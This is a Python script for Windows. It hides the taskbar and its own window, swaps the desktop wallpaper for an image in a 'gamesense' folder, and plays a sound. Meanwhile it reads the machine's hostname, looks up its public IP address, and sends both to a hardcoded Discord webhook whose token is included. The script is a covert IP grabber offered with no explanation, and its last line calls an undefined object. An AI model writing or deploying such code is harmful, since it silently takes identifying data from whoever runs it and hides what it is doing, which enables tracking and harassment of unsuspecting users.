import os
from discord_webhook import DiscordWebhook
import socket
import webbrowser
import requests
import ctypes
import win32gui, win32con
import win32.lib.win32con as win32con
import winsound
from ctypes import windll

h = windll.user32.FindWindowA(b'Shell_TrayWnd', None)

windll.user32.ShowWindow(h, 0)
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
ctypes.windll.user32.SystemParametersInfoW(20,0,'C:\\temp\\gamesense\\wallpaper.png', 3) 
def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address
ip = get_ip_address()
pc = socket.gethostname()




webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
response = webhook.execute()
winsound.PlaySound('chipi.wav', 0)


window.close()
